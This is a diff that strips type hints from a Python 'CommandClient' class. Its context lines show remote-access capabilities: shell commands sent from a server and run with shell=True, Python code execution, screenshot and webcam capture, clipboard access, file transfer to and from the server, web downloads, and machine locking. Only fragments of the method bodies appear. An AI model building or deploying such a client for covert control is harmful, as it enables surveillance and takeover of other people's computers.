@@ -25,10 +25,10 @@ class CommandClient(Client):
     # List of tasks that have output, but timed out
     task_list: list[tasks.Task] = []
 
-    def __init__(self, ssl_context: ssl.SSLContext) -> None:
+    def __init__(self, ssl_context: ssl.SSLContext):
         Client.__init__(self, ssl_context)
 
-    def listen(self) -> None:
+    def listen(self):
         """ Listen for coming commands """
         # Wait for a command to arrive
         command = self.read().decode()
@@ -74,32 +74,32 @@ class CommandClient(Client):
             case _:
                 logging.debug('Received unrecognized command: %s', command)
 
-    def ping(self) -> None:
+    def ping(self):
         """ Respond to server ping """
         logging.info("Responding to server ping")
         self.write(b'PONG')
 
-    def cwd(self) -> None:
+    def cwd(self):
         """ Send cwd to server """
         logging.info("Sending cwd to server")
         self.write(os.getcwdb())
 
-    def system(self) -> None:
+    def system(self):
         """ Send platform to server """
         logging.info("Sending system to server")
         self.write(platform.system().encode())
 
-    def user(self) -> None:
+    def user(self):
         """ Send user to server """
         logging.info("Sending user to server")
         self.write(getpass.getuser().encode())
 
-    def home(self) -> None:
+    def home(self):
         """ Send home to server """
         logging.info("Sending home to server")
         self.write(os.path.expanduser('~').encode())
 
-    def hostname(self) -> None:
+    def hostname(self):
         """ Send hostname to server """
         logging.info("Sending hostname to server")
 
@@ -110,14 +110,14 @@ class CommandClient(Client):
 
         self.write(hostname.encode())
 
-    def shell(self) -> None:
+    def shell(self):
         """ Open a shell for peer """
         command = self.read().decode()
         logging.info('Executing shell command: %s', command)
         output = subprocess.run(command, shell=True, capture_output=True, check=False)
         self.write(output.stdout + output.stderr)
 
-    def interpreter(self) -> None:
+    def interpreter(self):
         """ Open python interpreter for peer """
         command = self.read().decode()
 
@@ -136,7 +136,7 @@ class CommandClient(Client):
         else:
             self.write(output.encode())
 
-    def screenshot(self) -> None:
+    def screenshot(self):
         """ Take a screenshot """
         logging.debug('Capturing screenshot')
         try:
@@ -149,7 +149,7 @@ class CommandClient(Client):
             logging.info('Successfully captured screenshot')
         self.write(data)
 
-    def webcam(self) -> None:
+    def webcam(self):
         """ Capture webcam """
         logging.debug('Capturing webcam')
         try:
@@ -161,7 +161,7 @@ class CommandClient(Client):
             logging.info('Captured webcam')
         self.write(img_data)
 
-    def copy(self) -> None:
+    def copy(self):
         """ Copy to clipboard """
         logging.debug('Attempting to copy to clipboard')
         data = self.read().decode()
@@ -174,7 +174,7 @@ class CommandClient(Client):
             logging.info('Copied "%s" to clipboard', data)
             self.write(b'SUCCESS')
 
-    def paste(self) -> None:
+    def paste(self):
         """ Paste from clipboard """
         logging.debug('Attempting to paste from clipboard')
         try:
@@ -189,7 +189,7 @@ class CommandClient(Client):
             self.write(b'SUCCESS')
             self.write(content.encode())
 
-    def send_file(self) -> None:
+    def send_file(self):
         """ Send a file to server """
         logging.debug('Sending file to server')
         filename = self.read().decode()
@@ -210,7 +210,7 @@ class CommandClient(Client):
         else:
             logging.info('Successfully transferred file %s to server', str(filename))
 
-    def receive_file(self) -> None:
+    def receive_file(self):
         """ Receive file from server """
         logging.debug('Attempting to receive file from server')
         filename = self.read().decode()
@@ -229,7 +229,7 @@ class CommandClient(Client):
         else:
             logging.info("Transferred '%s' from server successfully", filename)
 
-    def download(self) -> None:
+    def download(self):
         """ Download a file from the web """
         logging.debug("Attempting to download file from the web")
         url, filename = json.loads(self.read().decode())
@@ -248,7 +248,7 @@ class CommandClient(Client):
             logging.info("Downloading file from '%s' as '%s'", url, filename)
             self.write(b'Success')
 
-    def lock(self) -> None:
+    def lock(self):
         """ Lock Machine (Windows only) """
         logging.debug("Attempting to lock machine")
 
@@ -264,7 +264,7 @@ class CommandClient(Client):
             logging.info("Locked machine")
             self.write(b'LOCKED')
 
-    def get_tasks(self) -> None:
+    def get_tasks(self):
         """ Get current tasks (background threads), removes fully processed ones """
         task_info = []
         tasks.clean(self.task_list)
@@ -277,7 +277,7 @@ class CommandClient(Client):
 
         self.write(json.dumps(task_info).encode())
 
-    def stoptask(self) -> None:
+    def stoptask(self):
         """ Stop a running task """
         task_id = self.read().decode()
         logging.debug("Attempting to stop task (%s)", task_id)
@@ -299,7 +299,7 @@ class CommandClient(Client):
         logging.debug("Task stopped: %s (%s)", task.name, task_id)
         self.write(b'STOPPED')
 
-    def taskoutput(self) -> None:
+    def taskoutput(self):
         """ Get the output of a task if available """
         task_id = self.read().decode()
         logging.debug("Attempting to get task (%s) output", task_id)
